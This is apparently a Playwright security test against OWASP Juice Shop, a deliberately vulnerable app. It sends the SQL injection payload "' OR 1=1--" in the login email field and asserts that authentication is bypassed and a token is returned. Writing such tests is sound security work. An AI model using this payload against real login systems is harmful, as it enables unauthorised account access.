import {
  test,
  expect,
} from '@playwright/test';

test(
  'detects SQL injection authentication bypass',
  {
    tag: [
      '@security',
      '@injection',
      '@negative',
    ],
  },
  async ({ request }) => {
    const response = await request.post(
      '/rest/user/login',
      {
        data: {
          email: "' OR 1=1--",
          password: 'invalid-password',
        },
      },
    );

    // Juice Shop is intentionally vulnerable.
    // A secure application should return 401.
    expect(response.status()).toBe(200);

    const responseBody = await response.json();

    expect(
      responseBody.authentication?.token,
    ).toBeTruthy();

    expect(
      responseBody.authentication?.bid,
    ).toBeDefined();
  },
);